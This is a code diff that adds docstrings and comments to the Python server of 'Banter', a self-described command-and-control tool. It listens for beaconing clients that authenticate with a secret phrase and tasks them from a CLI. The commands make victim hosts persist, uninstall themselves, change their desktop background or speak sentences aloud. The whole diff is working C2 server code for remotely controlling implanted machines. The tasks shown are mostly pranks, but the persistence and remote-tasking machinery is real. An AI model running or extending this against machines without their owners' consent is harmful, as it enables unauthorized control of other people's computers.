@@ -1,4 +1,5 @@
-# banter
+"""Server component of the Banter project."""
+
 import socket
 import sys
 import threading
@@ -8,12 +9,20 @@ import copy
 
 
 class Master():
+    """Command & Control component made up of a connection listener and a command-line interface for tasking(CLI).
+
+    See CLI tasking section for more details on supported tasking methods.
+    """
 
     def __init__(self):
+        """Initialise logging, constants and the connection listener and cli threads."""
         logging.basicConfig(level=logging.NOTSET)
         logging.debug("Starting up")
+        # Connection port
         self.PORT = 34072
+        # Beaconing/Tasking port
         self.TASKING_PORT = 34073
+        # Fileserving port
         self.SERVING_PORT = 34074
         self.BUFFER_SIZE = 8192
         self.TASKING_WINDOW = 10
@@ -22,10 +31,9 @@ class Master():
         self.UNACKED_LIMIT = 3
         # How many times to attempt a connection before aborting
         self.CONNECTION_ATTEMPT_LIMIT = 5
-
         # Dict of client address : counter of unacked messages
-        # {address: unacked_counter}
         self.authed_clients = {}
+        # Dict of client address : client workstation name
         self.client_names = {}
 
         self.t1 = threading.Thread(target=self.listen)
@@ -35,8 +43,9 @@ class Master():
         self.t2.start()
 
     """ Connection listener and related functionality """
-    """ Listen for new clients and record connection details """
+
     def listen(self):
+        """Constantly listen for new clients and record connection details."""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(5)
         sock.bind(('', self.PORT))
@@ -70,32 +79,42 @@ class Master():
             except Exception as e:
                 logging.warn("Unhandled Exception: {0}".format(e))
 
-    """ Only accept clients who send the secret phrase """
     def authenticate_client(self, data):
+        """Only accept clients who send the secret phrase.
+
+        @param data: the authentication phrase sent by a connecting client
+        @return: true if the authentication was successful
+        """
         if data == b"Speak friend and enter":
             return True
         else:
             return False
 
     """ CLI/tasking and related functionality """
-    """ Command line interface """
+
     def cli(self):
+        """Command line interface."""
         while True:
             cmd = input("banter> ")
             self.parse_cmd(cmd)
 
-    """ CLI command parsing """
     def parse_cmd(self, cmd):
+        """Parse cli commands and delegate supported tasking to respective methods.
+
+        @param cmd: the command issued on the cli
+        """
         cmd = cmd.split(" ")
         if cmd[0] == "help" or cmd[0] == "?":
-            print("In development...")
-            print(" * hi")
-            print(" * listclients, lc")
-            print(" * kill, kys <target>")
-            print(" * changebackground, cb <target> <image_file>")
-            print(" * speak, ss <target> <sentence>")
-            print(" * stayalive, sa <target>")
-            print(" * exit, quit")
+            print(" Supported tasking:")
+            print(" * hi - Verify the connection with all clients")
+            print(" * listclients, lc - List all authenticated clients and their status")
+            print(" * kill, kys <target> - Kill the client, including removing persistence")
+            print(" * changebackground, cb <target> <image_file> - Change the host machine's background picture")
+            print(" * speak, ss <target> <sentence> - Play an audio clip of the sentence using the Microsoft speech \
+                  API on the host machine")
+            print(" * stayalive, sa <target> - Persist on the host machine (Note: The client does this automatically \
+                  during startup")
+            print(" * exit, quit - Kill the C&C server. (Note: this does not send any commands to clients)")
         elif cmd[0] == "hi":
             print("Sending hi to clients")
             self.send_message("hi")
@@ -116,8 +135,13 @@ class Master():
         else:
             print("Invalid command")
 
-    """ Send tasking to client by first waiting for beacon and then tasking via the beaconing port """
     def send_message(self, msg, client=None):
+        """Send tasking to client by first waiting for beacon and then tasking via the beaconing port.
+
+        @param msg: the tasking string to be recognised and acted upon by the client
+        @param client: the client/s intended to receive the task. by default (no arg supplied) all clients are tasked
+        @return: nothing
+        """
         # Broadcast when client not specified
         if client is None:
             clients = set(self.authed_clients)
@@ -179,56 +203,64 @@ class Master():
                 self.client_names.pop(client)
         sock.close()
 
-    """ Client tasking """
-    """ listclients command """
-    # lc
+    """ Client tasking - see parse_cmd() for more information"""
+
     def display_clients(self):
+        """listclients/lc command."""
         print("Active clients:")
         print("   (name)              |(address)      |(unacked msgs)")
         for client in self.authed_clients:
             print(" * {0:20}|{1:15}|{2:2}".format(self.client_names[client], client, str(self.authed_clients[client])))
 
-    """ kill command """
-    # kys <target>
     def kill_client(self, cmd):
+        """kill/kys command.
+
+        @param cmd: command and argument (target)
+        """
         if ((len(cmd) == 2) and (cmd[1] in self.authed_clients)):
             target = cmd[1]
 
             # Send the task
-            # kys
+            # Tasking string: kys
             self.send_message("kys", target)
         else:
             print("Invalid command")
 
-    """ stayalive command """
-    # sa <target>
     def stay_alive(self, cmd):
+        """stayalive/sa command.
+
+        @param cmd: command and argument (target)
+        """
         if ((len(cmd) == 2) and (cmd[1] in self.authed_clients)):
             target = cmd[1]
 
             # Send the task
-            # sa
+            # Tasking string: sa
             self.send_message("sa", target)
         else:
             print("Invalid command")
 
-    """ speak command """
-    # ss <target> <sentence>
     def speak_sentence(self, cmd):
+        """speak/ss command.
+
+        @param cmd: command and arguments (target, sentence)
+        """
         target = cmd[1]
         if ((len(cmd) >= 3) and (cmd[1] in self.authed_clients)):
             target = cmd[1]
             sentence = " ".join(cmd[2:])
 
             # Send the task
-            # ss,<sentence>
+            # Tasking string: ss,<sentence>
             self.send_message("{0},{1}".format("ss", sentence), target)
         else:
             print("Invalid command")
 
-    """ changebackground command """
-    # cb <target> <image file>
     def change_background(self, cmd):
+        """changebackground/cb command.
+
+        @param cmd: command and arguments (target, image)
+        """
         if ((len(cmd) == 3) and (cmd[1] in self.authed_clients)):
             target = cmd[1]
             img_file = cmd[2]
@@ -240,7 +272,7 @@ class Master():
                 return
 
             # Send the task
-            # cb,<LISTEN_PORT>
+            # Tasking string: cb,<LISTEN_PORT>
             self.send_message("{0},{1}".format("cb", self.SERVING_PORT), target)
 
             # Open a new TCP socket which will serve the file
@@ -267,8 +299,10 @@ class Master():
                     data = conn.recv(self.BUFFER_SIZE)
                     logging.debug("{0} > '{1}'".format(addr, data))
                     if (addr == target) and (data == b"plsehlp"):
+                        # Appropriate connection made
                         break
                     conn.close()
+                # Serve the image
                 data = img.read(self.BUFFER_SIZE)
                 while data:
                     conn.send(data)
